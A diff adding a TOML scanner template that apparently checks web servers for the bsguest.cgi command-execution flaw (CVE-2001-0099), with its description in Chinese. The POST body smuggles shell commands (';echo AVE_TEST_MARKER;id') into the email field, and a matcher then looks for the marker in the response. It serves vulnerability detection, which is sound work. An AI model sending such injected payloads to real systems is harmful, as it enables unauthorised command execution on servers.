@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测目标服务器 bsguest.cgi 是否存在远程命令执行漏洞（CVE-2001-0099），通过在 email 字段注入 shell 元字符（如 ;）执行无害命令并观察响应中是否包含命令执行结果，从而验证漏洞是否存在"
+id = "POC-AVE-2001-0042"
+name = "Brian Stanback bsguest.cgi 远程命令执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2001-0042"]
+vuln_id = [
+    "CVE-2001-0099",
+    "AVE-2001-0042",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/bsguest.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "name=test&email=test@test.com;echo%20AVE_TEST_MARKER;id&comments=test&action=sign"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST_MARKER"]
